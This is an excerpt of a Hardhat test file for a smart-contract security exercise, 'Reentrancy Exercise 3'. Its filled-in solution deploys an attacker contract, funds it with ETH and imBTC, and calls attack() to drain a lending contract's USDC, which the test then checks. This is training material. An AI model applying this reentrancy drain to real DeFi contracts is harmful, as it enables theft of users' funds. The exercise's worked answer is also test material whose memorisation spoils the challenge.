...
describe("Reentrancy Exercise 3", function () {
  ...
  let exploitReentracy3: ExploitReentracy3;
  let imBTC: IERC20;
  let usdc: IERC20;
  ...
  before(async () => {
    ...
    const ExploitReentracy3 = (await ethers.getContractFactory(
      "ExploitReentracy3",
      attacker
    )) as ExploitReentracy3__factory;
    exploitReentracy3 = await ExploitReentracy3.deploy(
      chainLend.address
    );
    ...
    await usdc
      .connect(USDCWhale)
      .transfer(chainLend.address, USDC_IN_CHAINLEND);
  });

  it("Exploit", async () => {
    /** CODE YOUR SOLUTION HERE */
    await attacker.sendTransaction({
      to: exploitReentracy3.address,
      value: ethers.utils.parseUnits("99"),
    });

    await imBTC
      .connect(attacker)
      .transfer(exploitReentracy3.address, ethers.utils.parseUnits("1", 8));

    // Log imBTC balance of attacker
    console.log(
      "Attacker imBTC balance:",
      ethers.utils.formatUnits(await imBTC.balanceOf(exploitReentracy3.address), 8)
    );

    await exploitReentracy3.connect(attacker).attack();
  });
  ...
  after(async () => {
    ...
    expect(await usdc.balanceOf(attacker.address)).to.be.equal(
      USDC_IN_CHAINLEND
    );
  });
});
